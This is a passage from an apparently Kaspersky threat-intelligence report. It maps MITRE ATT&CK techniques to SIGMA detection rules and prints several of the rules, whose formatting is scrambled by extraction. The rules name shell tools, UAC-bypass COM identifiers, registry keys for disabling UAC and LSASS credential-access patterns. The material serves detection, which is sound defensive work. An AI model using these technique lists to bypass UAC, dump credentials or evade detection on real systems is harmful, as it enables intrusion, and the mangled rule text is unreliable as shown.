Folder||\n|Available in the full version of the report in Kaspersky TIP: Account Manipulation T1098 • Account Creation via Powershell • Account Creation via net.exe • Adding Account in Domain or Local Admin Group via net.exe • Adding Account in Domain or Local Admin Group via PowerShell||\n|Available in the full version of the report in Kaspersky TIP: Create or Modify System Process: Windows Service • Service Installation From Non-System Directory T1543.003 • Service Image Path Modification via sc.exe||\n|Available in the full version of the report in Kaspersky TIP: BITS Jobs T1197 • File Download via Bitsadmin • Suspicious Jobs via Bitsadmin||\n\n\n##### Techniques SIGMA\n\nExploit Public-Facing\nApplication T1190    - [Windows Shell Start by Web Applications]\n\nUser Execution T1204    - [Started windows shell from Trusted process]\n\n### • [Drop Execution File From by Trusted Process]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nCommand and Scripting\nInterpreter T1059\n\n### • [Execution of Downloaded Powershell Code]\n • [Encoded/decoded PowerShell Сode Execution]\n • [Executing PS1 from Public Directory]\n • [Powershell Suspicious Arguments]\n • [Executing JavaScript from Public Directories]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nWindows Management\nInstrumentation T1047\n\n### • [Suspicious Command wmic.exe]\n • [Suspicious Child Process Wmiprvse.exe]\n\nScheduled Task/Job:    - [Scheduled Task Start from Public Directory ]\nScheduled Task T1053.005    - [Windows Shell Started Schtasks]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nBoot or Logon Autostart\nExecution: Registry Run Keys\n/ Startup Folder T1547.001    - [Modification Main Registry Run Keys]\n\n### • [Adding Path of Open Folder in Run Keys via Registry]\n • [Adding Suspicious File in Autorun Keys via Registry]\n • [Suspicious File Creation in Startup Folder]\n\nAvailable in the full version of the report in Kaspersky TIP:\nAccount Manipulation T1098\n\n### • [Account Creation via Powershell]\n • [Account Creation via net.exe]\n • [Adding Account in Domain or Local Admin Group via net.exe]\n • [Adding Account in Domain or Local Admin Group via PowerShell]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nCreate or Modify System\nProcess: Windows Service\nT1543.003    - [Service Installation From Non-System Directory]\n\n### • [Service Image Path Modification via sc.exe]\n\nAvailable in the full version of the report in Kaspersky TIP:\nBITS Jobs T1197\n\n### • [File Download via Bitsadmin]\n • [Suspicious Jobs via Bitsadmin]\n\nAbuse Elevation Control    - [UAC Bypass via COM Object]\nMechanism: Bypass User Account Control T1548.002      - [Disabling UAC via Registry]\n\n\n-----\n\n##### Techniques SIGMA\n\nExploitation for Privilege Available in the full version of the report in Kaspersky TIP:\nEscalation T1068\n\n### • [Created Windows Shell from Critical Windows Process]\n\nAccess Token Manipulation Available in the full version of the report in Kaspersky TIP:\nT1134\n\n### • [Get-System Detection (Empire, CobaltStrike, Metasploit Meterpreter)]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nSigned Binary Proxy\nExecution T1218\n\n### • [Shell Creation by Mshta.exe]\n • [External HTA file Execution]\n • [Executing HTA file from Public Directory]\n • [Shell Creation by Regsvr32.exe]\n • [External DLL Execution via Regsvr32.exe]\n • [Shell Creation by Rundll32.exe]\n • [External DLL Execution via Rundll32]\n • [Suspicious Rundll32.exe Arguments]\n\nAvailable in the full version of the report in Kaspersky TIP:\nProcess Injection T1055\n\n### • [Remote Thread Creation in Critical Process]\n • [DLL Injection via LoadLibrary API]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nImpair Defences: Disable\nor Modify System Firewall\nT1562.004     - [Disabling Windows Firewall via Netsh.exe]\n\n### • [Firewall Configuration Modification via Netsh.exe]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nDisable or Modify Tools\nT1562.001\n\n### • [Disabling Windows Defender via Registry]\n • [Disabling or Modification Windows Defender via Powershell]\n • [Windows Defender Exclusions Modification via Registry]\n\nMasquerading T1036     - [Executing File Named as System Process in Unusual Directory]\n\n### • [Anomaly in the Windows Critical Process Tree]\n • [Created Windows Shell from Critical Windows Process]\n\nIndicator Removal on Host: Available in the full version of the report in Kaspersky TIP:\nFile Deletion T1070.004\n\n### • [Ping and File Deletion in Command line]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nIndicator Removal on Host:\nClear Windows Event Logs\nT1070.001     - [Clear Windows Event Logs via Command Line]\n\n### • [Clear Windows Event Logs ]\n\nDeobfuscate/Decode Files Available in the full version of the report in Kaspersky TIP:\nor Information T1140\n\n### • [Encoded/decoded PowerShell Сode Execution]\n\n\n-----\n\n##### Techniques SIGMA\n\nOS Credential Dumping:\nLSASS Memory T1003.001     - [Suspicious LSASS Memory Access]\n\n### • [Detected Access to SAM,SYSTEM and SECURITY registry hives]\n\nCredentials from Password Available in the full version of the report in Kaspersky TIP:\nStores: Credentials from\nWeb Browsers T1555.003     - [Suspicious Access to Credentials from Web Browsers]\n\nSystem Network\nConnections Discovery     - [System Network Connections Discovery via Standard Windows Utilities]\nT1049     - [System Network Connections Discovery via PowerShell]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nRemote System Discovery\nT1018\n\n### • [Remote System Discovery via Standard Windows Utilities]\n • [Remote System Discovery via PowerShell]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nNetwork Share Discovery\nT1135\n\n### • [Network Share Discovery via Standard Windows Utilities]\n • [Network Share Discovery via PowerShell]\n\nAvailable in the full version of the report in Kaspersky TIP:\nAccount Discovery T1087\n\n### • [Account Discovery via Standard Windows Utilities]\n • [Account Discovery via PowerShell]\n\nAvailable in the full version of the report in Kaspersky TIP:\nProcess Discovery T1057\n\n### • [Process Discovery via Standard Windows Utilities]\n • [Process Discovery via PowerShell]\n\nRemote Services: Remote\nDesktop Protocol T1021.001     - [Enabling RDP via Registry]\n\n### • [Enabling RDP in Windows Firewall]\n\nAvailable in the full version of the report in Kaspersky TIP:\nLateral Tool Transfer T1570\n\n### • [File Download via Bitsadmin]\n • [Psexec Suspicious Commands]\n • [PsExec Pipes Artefacts]\n • [Mounting Shares via net]\n • [Using Explicit Credentials while mounting Share]\n\nAvailable in the full version of the report in Kaspersky TIP:\n\nRemote Services: SMB/\nWindows Admin Shares\nT1021.002     - [PsExec Suspicious Commands]\n\n### • [PsExec Pipes Artefacts]\n • [Mounting Shares via net]\n • [Using Explicit Credentials while mounting Share]\n\n\n-----\n\n##### Techniques SIGMA\n\nInhibit System Recovery\nT1490     - [Shadow Copies Deletion]\n\n### • [Disable Automatic Windows Recovery]\n\nAvailable in the full version of the report in Kaspersky TIP:\nService Stop T1489\n\n### • [Service Stop via taskkill]\n • [Service Stop via sc.exe]\n • [Service Stop via Powershell.exe]\n • [Service Stop via net.exe]\n\n\n-----\n\n```\n       title: Windows Shell Start by Web Applications\n\n```\ndescription: Detects windows shell start by web applications, may indicate web\n```\n       application exploitation\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n          - attack.Initial _ Access\n\n         - attack.T1190\n\n         - attack.Execution\n\n          - attack.T1059\n\n         - attack.Persistence\n\n          - attack.T1505.003\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nParentImage|contains:\n            - ‘\\php-cgi.exe’\n```\n              - ‘\\nginx.exe ‘\n\n```\n             - ‘\\w3wp.exe’\n\n             - ‘\\httpd.exe’\n\n             - ‘\\tomcat’\n\n            - ‘\\apache’\nImage|endswith:\n\n             - ‘\\mshta.exe’\n\n             - ‘\\wscript.exe’\n\n            - ‘\\mftrace.exe’\n\n            - ‘\\powershell.exe’\n\n             - ‘\\powershell _ ise.exe’\n\n            - ‘\\scriptrunner.exe’\n\n             - ‘\\cmd.exe’\n\n             - ‘\\forfiles.exe’\n\n            - ‘\\msiexec.exe’\n\n             - ‘\\rundll32.exe’\n\n             - ‘\\wmic.exe’\n\n             - ‘\\hh.exe’\n\n             - ‘\\regsvr32.exe’\n\n             - ‘\\schtasks.exe’\n\n             - ‘\\scrcons.exe’\n\n             - ‘\\bash.exe’\n\n             - ‘\\sh.exe’\n\n             - ‘\\cscript.exe’\nfilter:\nCommandLine|contains:\n            - ‘rotatelogs’\ncondition: selection and not filter\nfalsepositives: unknown\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Started windows shell from Trusted process\n\n```\ndescription: Start windows shell from frequent attachment format in a letter\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n          - attack.Initial _ Access\n\n          - attack.T1204.002\n\n         - attack.Execution\n\n          - attack.T1566.001\n\n          - attack.T1059\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nParentImage|endswith:\n\n             - ‘\\winword.exe’\n\n             - ‘\\access.exe’\n\n             - ‘\\excel.exe’\n\n            - ‘\\mspub.exe’\n\n            - ‘\\powerpnt.exe’\n\n             - ‘\\visio.exe’\n\n             - ‘\\outlook.exe’\n\n             - ‘\\wordpad.exe’\n\n            - ‘\\notepad.exe’\n\n             - ‘\\AcroRd32.exe’\n\n             - ‘\\acrobat.exe’\nImage|endswith:\n\n             - ‘\\mshta.exe’\n\n             - ‘\\wscript.exe’\n\n            - ‘\\mftrace.exe’\n\n            - ‘\\powershell.exe’\n\n             - ‘\\powershell _ ise.exe’\n\n            - ‘\\scriptrunner.exe’\n\n             - ‘\\cmd.exe’\n\n             - ‘\\forfiles.exe’\n\n            - ‘\\msiexec.exe’\n\n             - ‘\\rundll32.exe’\n\n             - ‘\\wmic.exe’\n\n             - ‘\\hh.exe’\n\n             - ‘\\regsvr32.exe’\n\n             - ‘\\schtasks.exe’\n\n             - ‘\\scrcons.exe’\n\n             - ‘\\bash.exe’\n\n             - ‘\\sh.exe’\n\n             - ‘\\cscript.exe’\n\n\n-----\n\nfilter:\nImage|endswith:\n\n            - ‘\\rundll32.exe’\nCommandLine|contains:\n\n             - ‘ndfapi.dll’\n\n            - ‘tcpmonui.dll’\n\n             - ‘printui.dll’\n\n            - ‘devmgr.dll’\n\n            - ‘keymgr.dll’\n\n            - ‘powrprof.dll’\n\n             - ‘advapi32.dll’\n\n            - ‘shdocvw.dll’\n\n             - ‘user32.dll’\n\n             - ‘shell32.dll’\ncondition: selection and not filter\nfalsepositives: unknown\n```\n       level: high\n       title: Drop Execution File From by Trusted Process\n\n```\ndescription: An adversary may weaponize an office document to drop and execute the\n```\n       malicious payload\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Initial _ Access\n\n          - attack.T1204.002\n\n         - attack.Execution\n\n          - attack.T1566.001\n```\n       logsource:\n          product: windows\n\n```\ncategory: file _ creation\n```\n       detection:\n          selection1:\n\n```\nImage|endswith:\n\n             - ‘\\winword.exe’\n\n             - ‘\\access.exe’\n\n             - ‘\\excel.exe’\n\n            - ‘\\mspub.exe’\n\n            - ‘\\powerpnt.exe’\n\n             - ‘\\visio.exe’\n\n             - ‘\\outlook.exe’\n\n             - ‘\\wordpad.exe’\n\n            - ‘\\notepad.exe’\n\n             - ‘\\AcroRd32.exe’\n\n             - ‘\\acrobat.exe’\n\n\n-----\n\nTargetFilename|endswith:\n-’.bat’\n-’.cmd’\n-’.cpl’\n-’.exe’\n-’.hta’\n-’.dll’\n-’.reg’\n-’.vb’\n-’.vbe’\n-’.vbs’\n-’.vba’\n-’.wsf’\n-’.wsc’\n-’.ps1’\n-’.jse’\n-’.js’\n-’.msi’\n-’.sct’\n-’.pif’\n-’.paf’\n-’.rgs’\n```\n          condition: selection1\n\n```\nfalsepositives: unknown\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Windows Shell Started Schtasks\n\n```\ndescription: Suspicious parent process schtasks\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Execution\n\n         - attack.Persistence\n\n         - attack.Privilege _ Escalation\n\n          - attack.T1053.005\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nImage|endswith:\n\n             - ‘\\schtasks.exe’\nParentImage|endswith:\n\n             - ‘\\powershell _ ise.exe’\n\n             - ‘\\cmstp.exe’\n\n             - ‘\\appvlp.exe’\n\n            - ‘\\mftrace.exe’\n\n            - ‘\\scriptrunner.exe’\n\n             - ‘\\forfiles.exe’\n\n            - ‘\\msiexec.exe’\n\n             - ‘\\rundll32.exe’\n\n             - ‘\\mshta.exe’\n\n             - ‘\\hh.exe’\n\n             - ‘\\wmic.exe’\n\n             - ‘\\regsvr32.exe’\n\n             - ‘\\scrcons.exe’\n\n             - ‘\\bash.exe’\n\n             - ‘\\sh.exe’\n\n             - ‘\\cscript.exe’\n\n             - ‘\\wscript.exe’\n\n            - ‘\\powershell.exe’\n\n            - ‘\\cmd.exe’\n```\n          condition: selection\n\n```\nfalsepositives: Legitimate System Administrator actions\n```\n       level: medium\n\n```\n\n-----\n\n```\n       title: Scheduled Task Start from Public Directory\n\n```\ndescription: Adversaries often create Scheduled Task with sample in Public\nDirectory\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Execution\n\n         - attack.Persistance\n\n         - attack.Privilege Escalation\n\n          - attack.T1053.005\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nImage|contains:\n\n             - ‘\\schtasks.exe’\nCommandline|contains:\n\n             - ‘\\ProgramData\\’\n\n             - ‘\\Users\\’\n\n             - ‘\\Public\\’\n\n             - ‘\\AppData\\’\n\n             - ‘\\Desktop\\’\n\n             - ‘\\Downloads\\’\n\n             - ‘\\Temp\\’\n\n             - ‘\\Tasks\\’\n\n             - ‘\\$Recycle’\n```\n          condition: selection\n\n```\nfalsepositives: Unknown\n```\n       level: medium\n\n```\n\n-----\n\n```\n       title: UAC Bypass via COM Object\n\n```\ndescription: Detects bypassing UAC via COM Object\n```\n       tags:\n\n```\n         - attack.Privilege _ Escalation\n\n         - attack.Defense _ Evasion\n\n          - attack.T1548.002\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection:\n\n```\nImage|endswith: ‘\\dllhost.exe’\nCommandLine|contains:\n\n             - ‘{3E5FC7F9-9A51-4367-9063-A120244FBEC7}’\n\n             - ‘{3E000D72-A845-4CD9-BD83-80C07C3B881F}’\n\n             - ‘{BD54C901-076B-434E-B6C7-17C531F4AB41}’\n\n             - ‘{D2E7041B-2927-42FB-8E9F-7CE93B6DC937}’\n\n             - ‘{E9495B87-D950-4AB5-87A5-FF6D70BF3E90}’\n```\n          condition: selection\n\n```\nfalsepositives: unknown\n```\n       level: high\n       title: Disabling UAC via Registry\n\n```\ndescription: Detects disabling UAC via registry\n```\n       tags:\n\n```\n         - attack.Privilege _ Escalation\n\n         - attack.Defense _ Evasion\n\n          - attack.T1548.002\n```\n       logsource:\n          product: windows\n          category: registry _ set\n       detection:\n          selection:\n\n```\nEventType: ‘SetValue’\nTargetObject:\n\n             - ‘HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\nEnableLUA’\n\n             - ‘HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\nConsentPromptBehaviorAdmin’\n\n             - ‘HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\nPromptOnSecureDesktop’\n\n             - ‘HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\\nEnableInstallerDetection’\nDetails: ‘DWORD (0x00000000)’\n```\n          condition: selection\n\n```\nfalsepositives: unknown\n```\n       level: high\n\n```\n\n-----\n\n```\n       title: Executing File Named as System Process in Unusual Directory\n\n```\ndescription: Adversaries may masquerade own malicious process like system\n```\n       process\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Defense _ Evasion\n\n          - attack.T1036.005\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection1:\n\n```\nimage|endswith:\n```\n              - “\\agentservice.exe”\n\n```\n            - “\\applicationframehost.exe”\n\n             - “\\applytrustoffline.exe”\n```\n              - “\\arp.exe”\n              - “\\at.exe”\n              - “\\audiodg.exe”\n              - “\\auditpol.exe”\n              - “\\baaupdate.exe”\n              - “\\bdechangepin.exe”\n              - “\\bdeuisrv.exe”\n              - “\\bioiso.exe”\n              - “\\bootim.exe”\n\n```\n             - “\\browser _ broker.exe”\n\n            - “\\bthudtask.exe”\n```\n              - “\\calc.exe”\n\n```\n            - “\\certreq.exe”\n```\n              - “\\change.exe”\n\n```\n            - “\\checknetisolation.exe”\n```\n              - “\\chglogon.exe”\n\n```\n            - “\\chkdsk.exe”\n```\n              - “cipher.exe”\n              - “\\colorcpl.exe”\n              - “\\compmgmtlauncher.exe”\n\n```\n            - “\\comppkgsrv.exe”\n\n            - “\\computerdefaults.exe”\n```\n              - “\\csrss.exe”\n\n```\n            - “\\ctfmon.exe”\n```\n              - “\\cttune.exe”\n\n```\n            - “\\datausagelivetiletask.exe”\n```\n              - “\\dccw.exe”\n              - “\\ddodiag.exe”\n              - “\\deploymentcsphelper.exe”\n              - “\\devicecensus.exe”\n              - “\\devicecredentialdeployment.exe”\n\n```\n\n-----\n\n```\n              - “\\deviceenroller.exe”\n\n```\n             - “\\dfrgui.exe”\n\n             - “\\disksnapshot.exe”\n```\n              - “\\dispdiag.exe”\n              - “\\displayswitch.exe”\n\n```\n             - “\\djoin.exe”\n```\n              - “\\dllhost.exe”\n\n```\n             - “\\dmcfghost.exe”\n```\n              - “\\dmomacpmo.exe”\n              - “\\dnscacheugc.exe”\n              - “\\dpapimig.exe”\n              - “\\dpiscaling.exe”\n\n```\n             - “\\driverquery.exe”\n```\n              - “\\drvinst.exe”\n              - “\\dsregcmd.exe”\n\n```\n             - “\\dstokenclean.exe”\n```\n              - “\\dwm.exe”\n              - “\\dxgiadaptercache.exe”\n              - “\\dxpserver.exe”\n\n```\n             - “\\easinvoker.exe”\n\n            - “\\easpolicymanagerbrokerhost.exe”\n```\n              - “\\edpcleanup.exe”\n              - “\\ehstorauthn.exe”\n              - “\\esentutl.exe”\n              - “\\expand.exe”\n              - “\\extrac32.exe”\n\n```\n             - “\\filehistory.exe”\n\n             - “\\fltmc.exe”\n\n             - “\\fodhelper.exe”\n\n             - “\\fondue.exe”\n\n             - “\\fsiso.exe”\n\n            - “\\fsquirt.exe”\n\n             - “\\fvenotify.exe”\n\n            - “\\fveprompt.exe”\n\n             - “\\fxscover.exe”\n\n             - “\\fxsunatd.exe”\n```\n              - “\\gamepanel.exe”\n\n```\n             - “\\genvalobj.exe”\n```\n              - “\\getmac.exe”\n              - “\\gpresult.exe”\n              - “\\gpupdate.exe”\n              - “\\hvax64.exe”\n              - “\\hvix64.exe”\n              - “\\hvsievaluator.exe”\n              - “\\ie4uinit.exe”\n              - “\\ieunatt.exe”\n              - “\\immersivetpmvscmgrsvr.exe”\n\n```\n\n-----\n\n```\n              - “\\iscsicli.exe”\n\n```\n             - “\\klist.exe”\n\n             - “\\ksetup.exe”\n```\n              - “\\label.exe”\n              - “\\licensingdiag.exe”\n\n```\n            - “\\lockscreencontentserver.exe”\n```\n              - “\\logonui.exe”\n              - “\\lpremove.exe”\n              - “\\lsass.exe”\n\n```\n             - “\\magnify.exe”\n```\n              - “\\mcbuilder.exe”\n              - “\\mdeserver.exe”\n              - “\\mdmappinstaller.exe”\n              - “\\mdmdiagnosticstool.exe”\n              - “\\mdsched.exe”\n\n```\n            - “\\mfpmp.exe”\n```\n              - “\\mobsync.exe”\n              - “\\mschedexe.exe”\n\n```\n             - “\\msconfig.exe”\n```\n              - “\\msdt.exe”\n              - “\\msdtc.exe”\n              - “\\msg.exe”\n              - “\\mshta.exe”\n              - “\\msiexec.exe”\n\n```\n             - “\\msinfo32.exe”\n```\n              - “\\mspaint.exe”\n              - “\\msra.exe”\n              - “\\mstsc.exe”\n              - “\\muiunattend.exe”\n              - “\\multidigimon.exe”\n\n```\n             - “\\musnotification.exe”\n\n             - “\\musnotificationux.exe”\n\n            - “\\musnotifyicon.exe”\n```\n              - “\\nbtstat.exe”\n              - “\\net.exe”\n              - “\\net1.exe”\n              - “\\netbtugc.exe”\n              - “\\nethost.exe”\n              - “\\netiougc.exe”\n\n```\n             - “\\netplwiz.exe”\n```\n              - “\\netsh.exe”\n              - “\\netstat.exe”\n              - “\\ngciso.exe”\n              - “\\nltest.exe”\n\n```\n             - “\\nslookup.exe”\n\n             - “\\ntoskrnl.exe”\n```\n              - “\\omadmclient.exe”\n\n```\n\n-----\n\n             - “\\openfiles.exe”\n\n             - “\\optionalfeatures.exe”\n\n             - “\\osk.exe”\n\n             - “\\pacjsworker.exe”\n\n             - “\\packageinspector.exe”\n```\n              - “\\pathping.exe”\n              - “\\pcalua.exe”\n\n```\n             - “\\perfmon.exe”\n\n             - “\\pinenrollmentbroker.exe”\n```\n              - “\\plasrv.exe”\n              - “\\pnpunattend.exe”\n              - “\\presentationhost.exe”\n              - “\\printbrmui.exe”\n              - “\\printui.exe”\n              - “\\psr.exe”\n\n```\n             - “\\query.exe”\n\n             - “\\quickassist.exe”\n\n             - “\\quser.exe”\n\n             - “\\qwinsta.exe”\n```\n              - “\\rasautou.exe”\n              - “\\rasdial.exe”\n              - “\\raserver.exe”\n              - “\\rdpclip.exe”\n              - “\\rdpinit.exe”\n              - “\\rdpsauachelper.exe”\n              - “\\rdpshell.exe”\n              - “\\rdvghelper.exe”\n              - “\\reagentc.exe”\n              - “\\recdisc.exe”\n              - “\\recover.exe”\n              - “\\reg.exe”\n              - “\\register-cimprovider.exe”\n              - “\\regsvr32.exe”\n\n```\n             - “\\rekeywiz.exe”\n```\n              - “\\relpost.exe”\n              - “\\repair-bde.exe”\n              - “\\resetengine.exe”\n              - “\\resmon.exe”\n              - “\\rmactivate.exe”\n              - “\\rmactivate _ isv.exe”\n              - “\\route.exe”\n              - “\\rpcping.exe”\n              - “\\rstrui.exe”\n              - “\\rundll32.exe”\n\n```\n             - “\\runtimebroker.exe”\n```\n              - “\\rwinsta.exe”\n              - “\\scrnsave.scr”\n\n```\n\n-----\n\n```\n              - “\\sdclt.exe”\n\n```\n             - “\\searchfilterhost.exe”\n```\n              - “\\secedit.exe”\n              - “\\securityhealthservice.exe”\n              - “\\services.exe”\n              - “\\settingsynchost.exe”\n              - “\\setupugc.exe”\n\n```\n             - “\\sgrmbroker.exe”\n```\n              - “\\slidetoshutdown.exe”\n              - “\\slui.exe”\n              - “\\smss.exe”\n              - “\\spaceagent.exe”\n              - “\\spectrum.exe”\n              - “\\spoolsv.exe”\n\n```\n            - “\\sppextcomobj.exe”\n\n             - “\\srtasks.exe”\n```\n              - “\\stordiag.exe”\n              - “\\svchost.exe”\n              - “\\sysreseterr.exe”\n              - “\\systempropertiesadvanced.exe”\n              - “\\systempropertiescomputername.exe”\n              - “\\systempropertieshardware.exe”\n              - “\\systemreset.exe”\n\n```\n             - “\\systemsettingsadminflows.exe”\n```\n              - “\\tabcal.exe”\n              - “\\tapiunattend.exe”\n              - “\\tar.exe”\n\n```\n             - “\\taskhostw.exe”\n\n             - “\\tasklist.exe”\n\n             - “\\taskmgr.exe”\n```\n              - “\\tcmsetup.exe”\n              - “\\tieringengineservice.exe”\n              - “\\tscon.exe”\n              - “\\tsdiscon.exe”\n\n```\n             - “\\tskill.exe”\n\n             - “\\typeperf.exe”\n\n             - “\\tzsync.exe”\n```\n              - “\\uevappmonitor.exe”\n              - “\\unlodctr.exe”\n\n```\n             - “\\upfc.exe”\n```\n              - “\\upgraderesultsui.exe”\n              - “\\useraccountcontrolsettings.exe”\n              - “\\userinit.exe”\n\n```\n             - “\\usocoreworker.exe”\n```\n              - “\\utilman.exe”\n              - “\\vaultcmd.exe”\n              - “\\vds.exe”\n\n```\n\n-----\n\n```\n              - “\\vdsldr.exe”\n              - “\\vssadmin.exe”\n              - “\\vssvc.exe”\n              - “\\w32tm.exe”\n\n```\n             - “\\waitfor.exe”\n```\n              - “\\wbengine.exe”\n              - “\\wecutil.exe”\n\n```\n             - “\\werfault.exe”\n\n             - “\\werfaultsecure.exe”\n```\n              - “\\wermgr.exe”\n\n```\n             - “\\wfs.exe”\n```\n              - “\\whoami.exe”\n              - “\\wiaacmgr.exe”\n              - “\\wiawow64.exe”\n\n```\n             - “\\wifitask.exe”\n```\n              - “\\wimserv.exe”\n              - “\\wininit.exe”\n              - “\\winlogon.exe”\n              - “\\winrs.exe”\n              - “\\winsat.exe”\n\n```\n             - “\\wkspbroker.exe”\n\n             - “\\wksprt.exe”\n```\n              - “\\wlrmdr.exe”\n              - “\\wmpdmc.exe”\n\n```\n             - “\\workfolders.exe”\n```\n              - “\\wpcmon.exe”\n              - “\\wpnpinst.exe”\n              - “\\wpr.exe”\n              - “\\write.exe”\n              - “\\wscadminui.exe”\n\n```\n             - “\\wsmanhttpconfig.exe”\n```\n              - “\\wsmprovhost.exe”\n              - “\\wusa.exe”\n          selection2:\n\n```\nImage|contains:\n\n             - ‘\\system32\\’\n\n             - ‘\\SysWOW64\\’\n\n             - ‘\\WinSxS\\’\n```\n          condition: selection1 and not selection2\n\n```\nfalsepositives: unknown\nlevel: High\n\n\n-----\n\n```\n       title: Anomaly in the Windows Critical Process Tree\n       description: Anomaly in childs/parents critical process windows\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Defense _ Evasion\n\n          - attack.T1036\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n          selection1:\n\n```\nImage|endswith:\n```\n               - “\\csrss.exe”\n          selection2:\n\n```\nParentImage|contains:\n             - ‘\\smss.exe’\n```\n          selection3: \n\n```\nImage|endswith:\n```\n               - “\\explorer.exe”\n          selection4:\n\n```\nParentImage|endswith:\n             - ‘\\userinit.exe’\n            - ‘\\winlogon.exe’\n            - ‘\\runtimebroker.exe’\n             - ‘\\explorer.exe’\nselection5:\nImage|endswith:\n```\n               - “\\lsass.exe”\n               - “\\lsm.exe”\n\n```\n             - “\\LsaIso.exe”\n```\n               - “\\services.exe” \n          selection6:\n\n```\nParentImage|endswith:\n            - ‘\\wininit.exe’\nselection7:\nImage|endswith:\n```\n               - “\\smss.exe”\n\n```\nselection8:\nParentImage|endswith:\n             - ‘\\smss.exe’\n            - ‘\\system’\nselection9:\nImage|endswith:\n```\n               - “\\svchost.exe”\n\n```\n            - “\\taskhost.exe”\n\n\n-----\n\n```\n          selection10:\n\n```\nParentImage|endswith:\n             - ‘\\services.exe’\n             - ‘\\svchost.exe’\n```\n          selection11:\n\n```\nImage|endswith:\n\n             - “\\taskhostw.exe”\n```\n          selection12:\n\n```\nParentImage|endswith:\n\n             - ‘\\svchost.exe’\n\n             - ‘\\taskhostw.exe’\n```\n          selection13:\n\n```\nImage|endswith:\n```\n              - “\\wininit.exe”\n              - “\\winlogon.exe”\n          selection14:\n\n```\nParentImage|endswith:\n\n             - ‘\\smss.exe’\nselection15:\nImage|endswith:\n\n            - “\\RuntimeBroker.exe”\n```\n          selection16:\n\n```\nParentImage|endswith:\n            - ‘\\RuntimeBroker.exe’\n             - ‘\\svchost.exe’\ncondition: (selection1 and not selection2) or (selection3 and not\nselection4) or (selection5 and not selection6) or\n(selection7 and not selection8) or (selection9 and not selection10) or\n(selection11 and not selection12) or\n(selection13 and not selection14) or (selection15 and not selection16)\nfalsepositives: unknown\nlevel: High\n\n\n-----\n\n```\n       title: Created Windows Shell from Critical Windows Process\n       description: Anomaly behaviour critical windows process\n\n```\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Defense _ Evasion\n\n          - attack.T1036\n```\n       logsource:\n          product: windows\n          category: process _ creation\n       detection:\n\n```\nParentImage|endswith:\n\n                - ‘\\searchindexer.exe’\n\n                - ‘\\lsaiso.exe’\n\n                - ‘\\lsm.exe’\n\n                - ‘\\spoolsv.exe’\n\n                - ‘\\wininit.exe’\n\n                - ‘\\smss.exe’\n\n                - ‘\\csrss.exe’\n\n                - ‘\\lsass.exe’\n\n                - ‘\\services.exe’\n\n                - ‘\\winlogon.exe’\nImage|endswith: -\n\n                - ‘\\powershell _ ise.exe’\n\n                - ‘\\cmstp.exe’\n\n                - ‘\\appvlp.exe’\n\n                - ‘\\mftrace.exe’\n\n                - ‘\\scriptrunner.exe’\n\n                 - ‘\\forfiles.exe’\n\n                - ‘\\msiexec.exe’\n\n                - ‘\\rundll32.exe’\n\n                - ‘\\mshta.exe’\n\n                - ‘\\hh.exe’\n\n                - ‘\\wmic.exe’\n\n                - ‘\\regsvr32.exe’\n\n                - ‘\\scrcons.exe’\n\n                - ‘\\bash.exe’\n\n                - ‘\\sh.exe’\n\n                - ‘\\cscript.exe’\n\n                - ‘\\wscript.exe’\n\n                - ‘\\powershell.exe’\n\n                - ‘\\cmd.exe’\n```\n          condition: selection\n\n```\nfalsepositives: Unknown\nlevel: High\n\n\n-----\n\n```\n       title: Suspicious LSASS Memory Access\n\n```\ndescription: Detects process access LSASS memory with read/write rights\nauthor: Kaspersky\n```\n       status: stable\n       tags:\n\n```\n         - attack.Credential _ Access\n\n          - attack.T1003.001\n```\n       logsource:\n          category: process _ access\n          product: windows\n       detection:\n          selection:\n\n```\nTargetImage|endswith: ‘\\lsass.exe’\nGrantedAccess|re: ‘(?i)0x\\w*[1235679abdef]\\w(\\s|$)’\n```\n          whitelist:\n\n```\nSourceImage|endswith:\n\n                - ‘\\wbem\\wmiprvse.exe’\n\n                - ‘\\csrss.exe’\n\n                - ‘\\wininit.exe’\n\n                - ‘\\lsm.exe’\n\n                - ‘\\logonui.exe’\n\n                - ‘\\msiexec.exe’\n\n                - ‘\\siworktm _ host64.exe’\n\n                - ‘\\tphkload.exe’\n\n                - ‘\\scenarioengine.exe’\n\n                 - ‘\\officeclicktorun.exe’\n\n                - ‘\\filesinusehelper.exe’\n\n                - ‘\\bct.exe’\n\n                - ‘\\apphelpercap.exe’\n\n                - ‘\\filesinusehelper.exe’\n\n                - ‘\\msert.exe’\n\n                - ‘\\sisidsservice.exe’\n\n                - 